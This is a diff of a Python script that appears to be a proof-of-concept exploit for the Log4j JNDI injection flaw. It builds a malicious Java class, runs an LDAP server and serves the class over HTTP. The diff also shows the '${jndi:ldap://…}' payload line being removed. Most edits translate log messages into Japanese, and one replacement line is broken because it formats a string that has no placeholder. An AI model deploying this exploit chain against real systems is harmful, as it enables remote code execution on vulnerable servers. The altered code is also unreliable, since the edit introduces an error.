@@ -64,20 +64,20 @@ public class Exploit {
         print(Fore.RED + f'[-] Something went wrong {e}')
         raise e
     else:
-        print(Fore.GREEN + '[+] Exploit java class created success')
+        print(Fore.GREEN + '[+] Exploit java classの生成に成功')
 
 
 def payload(userip: str, webport: int, lport: int) -> None:
     generate_payload(userip, lport)
 
-    print(Fore.GREEN + '[+] Setting up LDAP server\n')
+    print(Fore.GREEN + '[+] LDAPサーバーを設定中\n')
 
     # create the LDAP server on new thread
     t1 = threading.Thread(target=ldap_server, args=(userip, webport))
     t1.start()
 
     # start the web server
-    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
+    print(f"[+] ポートでウェブサーバを起動 {webport} http://0.0.0.0:{webport}")
     httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
     httpd.serve_forever()
 
@@ -91,8 +91,8 @@ def check_java() -> bool:
 
 
 def ldap_server(userip: str, lport: int) -> None:
-    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
-    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
+    sendme = "Exploit Port:1389" % (userip)
+    print(Fore.GREEN + f"[+] 送信: {sendme}\n")
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
